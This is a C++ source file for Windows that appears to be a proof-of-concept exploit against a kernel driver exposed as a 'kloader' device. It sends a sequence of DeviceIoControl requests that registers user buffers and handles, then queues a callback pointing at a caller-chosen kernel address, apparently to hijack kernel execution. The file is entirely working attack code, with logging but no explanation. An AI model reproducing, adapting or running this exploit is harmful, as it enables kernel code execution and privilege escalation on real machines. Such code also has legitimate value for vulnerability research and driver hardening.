#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdarg>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>

static FILE* g_log;

static void say(const char* fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    putchar('\n');
    fflush(stdout);
    if (g_log) {
        va_list ap2;
        va_start(ap2, fmt);
        vfprintf(g_log, fmt, ap2);
        fputc('\n', g_log);
        fflush(g_log);
        va_end(ap2);
    }
    va_end(ap);
}

static inline void store64(uint8_t* buf, size_t off, uint64_t val) {
    memcpy(buf + off, &val, 8);
}

struct Res {
    BOOL  done;
    DWORD err;
    DWORD bytes;
    DWORD wr;
    bool  pend;
};

static Res ioc(HANDLE dev, DWORD code, void* in, DWORD inlen, void* out, DWORD outlen, DWORD ms) {
    OVERLAPPED ov = {};
    ov.hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    Res r = {};
    if (!ov.hEvent) { r.err = GetLastError(); return r; }

    DWORD got = 0;
    BOOL ok = DeviceIoControl(dev, code, in, inlen, out, outlen, &got, &ov);
    r.done  = ok;
    r.err   = ok ? ERROR_SUCCESS : GetLastError();
    r.bytes = got;

    if (!ok && r.err == ERROR_IO_PENDING) {
        r.pend = true;
        r.wr = WaitForSingleObject(ov.hEvent, ms);
        if (r.wr == WAIT_OBJECT_0) {
            DWORD fin = 0;
            BOOL g = GetOverlappedResult(dev, &ov, &fin, FALSE);
            r.done  = g;
            r.err   = g ? ERROR_SUCCESS : GetLastError();
            r.bytes = fin;
            r.pend  = false;
        }
    }
    CloseHandle(ov.hEvent);
    return r;
}

struct Shared {
    HANDLE dev;
    HANDLE stop;
};

static DWORD WINAPI idle_thread(void* p) {
    WaitForSingleObject(static_cast<Shared*>(p)->stop, INFINITE);
    return 0;
}

static DWORD WINAPI watcher_thread(void* p) {
    Shared* s = static_cast<Shared*>(p);
    say("[watcher] register monitor 0x226C5C");
    Res r = ioc(s->dev, 0x226C5C, nullptr, 0, nullptr, 0, 1000);
    say("[watcher] result done=%d err=%lu bytes=%lu pend=%d wr=0x%lx",
        r.done, r.err, r.bytes, r.pend, r.wr);
    say("[watcher] exit");
    return 0;
}

int wmain(int argc, wchar_t** argv) {
    const wchar_t* devpath = L"\\\\.\\kloader\\{9C0B898D-6275-48EC-81B4-E5EDBE44B535}";
    uint64_t target = 0xFFFFF80041414141ull;

    if (argc >= 2) devpath = argv[1];
    if (argc >= 3) target = _wcstoui64(argv[2], nullptr, 0);

    fopen_s(&g_log, "ec_poc.log", "ab");
    say("start");
    say("path   : %ls", devpath);
    say("target : 0x%llX", static_cast<unsigned long long>(target));

    Shared sh = {};
    sh.stop = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (!sh.stop) { say("event fail %lu", GetLastError()); return 2; }

    DWORD tid = 0;
    HANDLE idle = CreateThread(nullptr, 0, idle_thread, &sh, 0, &tid);
    if (!idle) {
        say("thread fail %lu", GetLastError());
        CloseHandle(sh.stop);
        return 3;
    }
    say("idle thread h=%p tid=%lu", idle, tid);

    HANDLE dev = CreateFileW(devpath,
                             GENERIC_READ | GENERIC_WRITE,
                             FILE_SHARE_READ | FILE_SHARE_WRITE,
                             nullptr, OPEN_EXISTING,
                             FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
                             nullptr);
    if (dev == INVALID_HANDLE_VALUE) {
        say("open fail %lu", GetLastError());
        SetEvent(sh.stop);
        WaitForSingleObject(idle, 2000);
        CloseHandle(idle);
        CloseHandle(sh.stop);
        return 4;
    }
    sh.dev = dev;
    say("device h=%p", dev);

    uint8_t* ua = static_cast<uint8_t*>(VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    uint8_t* ka = static_cast<uint8_t*>(VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!ua || !ka) {
        say("alloc fail %lu", GetLastError());
        goto out;
    }
    ZeroMemory(ua, 0x1000);
    ZeroMemory(ka, 0x1000);
    say("ua=%p ka=%p", ua, ka);

    {
        HANDLE ev1 = CreateEventW(nullptr, TRUE, FALSE, nullptr);
        HANDLE ev2 = CreateEventW(nullptr, TRUE, FALSE, nullptr);
        if (!ev1 || !ev2) {
            say("event pair fail %lu", GetLastError());
            if (ev1) CloseHandle(ev1);
            if (ev2) CloseHandle(ev2);
            goto out;
        }
        say("ev1=%p ev2=%p", ev1, ev2);

        uint8_t ibuf[48] = {};
        store64(ibuf, 8,  reinterpret_cast<uint64_t>(ua));
        store64(ibuf, 16, reinterpret_cast<uint64_t>(ka));
        store64(ibuf, 24, reinterpret_cast<uint64_t>(idle));
        store64(ibuf, 32, reinterpret_cast<uint64_t>(ev1));
        store64(ibuf, 40, reinterpret_cast<uint64_t>(ev2));

        say("init 0x22EC40");
        Res ri = ioc(dev, 0x22EC40, ibuf, sizeof ibuf, nullptr, 0, 5000);
        say("init done=%d err=%lu bytes=%lu pend=%d wr=0x%lx", ri.done, ri.err, ri.bytes, ri.pend, ri.wr);
        if (!ri.done && !ri.pend) {
            say("init rejected, stop");
            CloseHandle(ev1);
            CloseHandle(ev2);
            goto out;
        }

        Sleep(300);

        uint8_t tbuf[64] = {};
        store64(tbuf, 0, 0x1122334455667788ull);
        store64(tbuf, 8, target);

        say("queue 0x22AC54 arg=0x1122334455667788 cb=0x%llX", static_cast<unsigned long long>(target));
        Res rq = ioc(dev, 0x22AC54, tbuf, sizeof tbuf, nullptr, 0, 5000);
        say("queue done=%d err=%lu bytes=%lu pend=%d wr=0x%lx", rq.done, rq.err, rq.bytes, rq.pend, rq.wr);
        if (!rq.done && !rq.pend) {
            say("queue rejected, stop");
            CloseHandle(ev1);
            CloseHandle(ev2);
            goto out;
        }

        Sleep(300);

        DWORD wtid = 0;
        HANDLE wt = CreateThread(nullptr, 0, watcher_thread, &sh, 0, &wtid);
        if (!wt) {
            say("watcher fail %lu", GetLastError());
            CloseHandle(ev1);
            CloseHandle(ev2);
            goto out;
        }
        say("watcher tid=%lu", wtid);
        say("watcher join 0x%lx", WaitForSingleObject(wt, 5000));
        CloseHandle(wt);

        say("wait 3000ms");
        Sleep(3000);

        say("fast enter 0x22ECE8");
        Res rf = ioc(dev, 0x22ECE8, nullptr, 0, nullptr, 0, 5000);
        say("fast done=%d err=%lu bytes=%lu pend=%d wr=0x%lx", rf.done, rf.err, rf.bytes, rf.pend, rf.wr);

        CloseHandle(ev1);
        CloseHandle(ev2);
    }

out:
    say("cleanup");
    SetEvent(sh.stop);
    WaitForSingleObject(idle, 5000);
    CancelIoEx(dev, nullptr);
    CloseHandle(dev);
    if (ua) VirtualFree(ua, 0, MEM_RELEASE);
    if (ka) VirtualFree(ka, 0, MEM_RELEASE);
    CloseHandle(idle);
    CloseHandle(sh.stop);
    say("end");
    if (g_log) fclose(g_log);
    return 0;
}
